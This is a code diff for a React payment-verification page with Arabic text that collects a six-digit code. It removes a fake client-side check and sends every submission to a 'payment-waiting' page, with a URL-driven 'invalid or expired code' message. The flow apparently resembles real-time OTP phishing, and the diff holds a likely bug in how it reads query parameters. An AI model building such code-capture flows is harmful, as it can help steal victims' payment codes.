@@ -1,16 +1,17 @@
 import { useState, useRef, useEffect } from 'react';
-import { useLocation } from 'wouter';
-import { Check, X } from 'lucide-react';
+import { useLocation, useSearchParams } from 'wouter';
+import { X } from 'lucide-react';
 import { Shell } from '../shared';
 
 export function PaymentVerificationPage() {
   const [, setLocation] = useLocation();
+  const [searchParams] = useSearchParams();
   const [code, setCode] = useState(['', '', '', '', '', '']);
-  const [verified, setVerified] = useState(false);
   const [error, setError] = useState('');
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const fullCode = code.join('');
+  const showError = searchParams.error === 'invalid';
 
   const handleChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
@@ -22,15 +23,6 @@ export function PaymentVerificationPage() {
 
     if (value && index < 5) {
       inputRefs.current[index + 1]?.focus();
-    }
-
-    if (newCode.every(digit => digit !== '')) {
-      if (fullCode === '000000') {
-        setLocation('/payment-rejected');
-      } else {
-        setVerified(true);
-        setTimeout(() => setLocation('/thank-you'), 1000);
-      }
     }
   };
 
@@ -66,31 +58,13 @@ export function PaymentVerificationPage() {
       setError('يرجى إدخال رمز التحقق كاملاً');
       return;
     }
-    if (fullCode === '000000') {
-      setLocation('/payment-rejected');
-    } else {
-      setVerified(true);
-      setTimeout(() => setLocation('/thank-you'), 1000);
-    }
+    // Navigate to waiting page first
+    setLocation('/payment-waiting');
   };
 
   useEffect(() => {
     inputRefs.current[0]?.focus();
   }, []);
-
-  if (verified) {
-    return (
-      <Shell>
-        <div className="page-enter mx-auto flex min-h-[70vh] max-w-md flex-col items-center justify-center px-5 py-10 text-center">
-          <div className="mb-6 grid size-16 place-items-center rounded-full bg-green-500 text-white">
-            <Check size={32} />
-          </div>
-          <h1 className="text-xl font-bold">تم التحقق بنجاح</h1>
-          <p className="mt-2 text-muted-foreground">جارٍ توجيهك...</p>
-        </div>
-      </Shell>
-    );
-  }
 
   return (
     <Shell>
@@ -132,8 +106,10 @@ export function PaymentVerificationPage() {
           </div>
 
           {/* Error Message */}
-          {error && (
-            <p className="text-center text-base text-red-500">{error}</p>
+          {(error || showError) && (
+            <p className="text-center text-base text-red-500">
+              {error || 'رمز التحقق غير صحيح أو منتهي، يرجى التحقق مرة أخرى أو انتظار رمز جديد'}
+            </p>
           )}
 
           {/* Verify Button */}
